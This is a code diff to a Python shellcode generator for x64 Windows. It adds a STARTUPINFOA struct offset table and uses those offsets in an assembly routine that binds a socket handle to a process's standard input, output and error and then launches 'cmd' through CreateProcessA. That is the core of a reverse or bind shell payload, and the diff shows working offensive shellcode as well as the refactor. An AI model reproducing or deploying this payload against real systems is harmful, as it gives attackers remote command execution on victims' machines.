@@ -79,6 +79,28 @@ class Shellcode():
             "name"                          : 0x220,
         }
 
+        self.struct_def_STARTUPINFOA = {
+            "cb"              : 0x00,
+            "lpReserved"      : 0x08,
+            "lpDesktop"       : 0x10,
+            "lpTitle"         : 0x18,
+            "dwX"             : 0x20,
+            "dwY"             : 0x24,
+            "dwXSize"         : 0x28,
+            "dwYSize"         : 0x2C,
+            "dwXCountChars"   : 0x30,
+            "dwYCountChars"   : 0x34,
+            "dwFillAttribute" : 0x38,
+            "dwFlags"         : 0x3C,
+            "wShowWindow"     : 0x40,
+            "cbReserved2"     : 0x42,
+            "lpReserved2"     : 0x48,
+            "hStdInput"       : 0x50,
+            "hStdOutput"      : 0x58,
+            "hStdError"       : 0x60,
+        }
+
+
         return
 
     def get_kernel32(self):
@@ -346,10 +368,10 @@ setup_STARTUPINFOA:
     mov eax, 0x68       ; lpStartInfo.cb = sizeof(_STARTUPINFO)
     mov [rbx], eax
     mov eax, 0x100      ; STARTF_USESTDHANDLES
-    mov [rbx+0x3c], eax ; lpStartupInfo.dwFlags
-    mov [rbx+0x50], rsi ; lpStartupInfo.hStdInput = socket handle
-    mov [rbx+0x58], rsi ; lpStartupInfo.hStdOutput = socket handle
-    mov [rbx+0x60], rsi ; lpStartupInfo.hStdError = socket handle
+    mov [rbx + {self.struct_def_STARTUPINFOA['dwFlags']}], eax ; lpStartupInfo.dwFlags
+    mov [rbx + {self.struct_def_STARTUPINFOA['hStdInput']}], rsi ; lpStartupInfo.hStdInput = socket handle
+    mov [rbx + {self.struct_def_STARTUPINFOA['hStdOutput']}], rsi ; lpStartupInfo.hStdOutput = socket handle
+    mov [rbx + {self.struct_def_STARTUPINFOA['hStdError']}], rsi ; lpStartupInfo.hStdError = socket handle
 
 ; RAX => CreateProcessA([in, optional]      LPCSTR                lpApplicationName,     // RCX      => NULL
 ;                       [in, out, optional] LPSTR                 lpCommandLine,         // RDX      => "cmd"
